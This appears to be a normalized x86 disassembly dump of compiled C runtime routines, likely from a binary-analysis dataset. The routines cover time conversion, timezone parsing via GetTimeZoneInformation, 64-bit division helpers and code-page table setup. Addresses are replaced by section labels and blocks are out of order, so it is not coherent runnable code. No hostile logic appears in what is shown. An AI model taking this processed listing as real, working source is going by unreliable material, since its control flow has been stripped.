jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_411ad9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_414890
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_410cee
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_4128b0
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_412870
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_412870
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_4128b0
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_412870
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_4128b0
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_4128b0
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_412870
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_4128b0
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_411d1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push edi
push 0x24
push 0xff
push esi
call sub_414890
mov edi [ ebp + 0xc ]
add esp 0xc
cmp edi ebx
jne r-xdata
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
mov ecx [ edi ]
jg r-xdata
call sub_410cee
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
mov eax esi
jmp r-xdata
call sub_4127df
lea eax [ ebp - 0x8 ]
push eax
call sub_411fd4
pop ecx
test eax eax
je r-xdata
jg r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
cmp ecx ebx
jb r-xdata
pop edi
lea eax [ ebp - 0xc ]
push eax
call sub_41200d
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_412046
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx ebx
mov edi [ edi ]
jl r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
push eax
push esi
call sub_411ad9
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub edi eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] ecx
call sub_411ad9
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
cmp edi 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov edi eax
mov eax [ ebp - 0x4 ]
mov ebx edx
cdq
sub edi eax
sbb ebx edx
push esi
call sub_41282e
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_4128b0
mov edi eax
mov eax [ esi + 0x4 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x3c
adc ebx edx
push ebx
push edi
call sub_412960
mov [ esi + 0x4 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi ] eax
adc ebx 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov edi eax
sub edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
sbb ebx ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_41282e
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_4128b0
mov edi eax
mov eax [ esi + 0x8 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_412960
mov [ esi + 0x8 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi + 0x4 ] eax
adc ebx 0xffffffff
push 0x0
push 0x3c
push ebx
push edi
call sub_412960
mov [ esi ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_411ad9
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push 0x0
push 0x18
push ebx
push edi
call sub_4128b0
mov ecx eax
test edx edx
jl r-xdata
add eax 0x18
add edi 0xffffffe8
mov [ esi + 0x8 ] eax
adc ebx 0xffffffff
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ esi + 0x18 ]
lea eax [ ecx + eax + 0x7 ]
cdq
push 0x7
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
mov [ esi + 0x18 ] edx
test eax eax
jg r-xdata
jg r-xdata
add [ esi + 0x1c ] ecx
add ecx 0x16d
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xb
jmp r-xdata
mov eax [ esi + 0x18 ]
add eax ecx
push 0x7
cdq
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov [ esi + 0x18 ] edx
test ecx ecx
jbe r-xdata
test edx edx
jg r-xdata
jl r-xdata
test ecx ecx
jae r-xdata
sub_411fd4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_41200d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_412046
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4120ca
push 0x2c
push r--data
call sub_4143e0
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_412091
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_412046
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_411fd4
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_41200d
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
call sub_41a371
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_41a2ea
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_410135
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_410680
inc eax
push eax
call sub_413ed3
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_417200
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_414425
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_41a235
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_410680
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_413c11
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_4120b9
push [ ebp - 0x24 ]
call sub_412097
push [ ebp - 0x28 ]
call sub_4120a8
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412376
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
jmp r-xdata
push eax
call sub_410135
pop ecx
push esi
call sub_40e9ad
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_40e9ad
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_41a235
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_41208b
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_41207f
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_40e9ad
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_412410
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_41200d
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40eccc
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_412607
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_411fd4
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_412410
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_412410
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_412410
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_412410
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_4127df
push 0x8
push r--data
call sub_4143e0
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_414425
retn
push 0x6
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412825
call sub_4120ca
inc [ rw-data ]
sub_41282e
push 0xc
push r--data
call sub_4143e0
push 0x6
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_412607
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412866
mov eax [ ebp - 0x1c ]
call sub_414425
retn
sub_412870
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4128b0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_412960
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_412a12
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_412a41
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_414890
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_412aa5
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_41a95b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_41a75c
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_41a75c
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
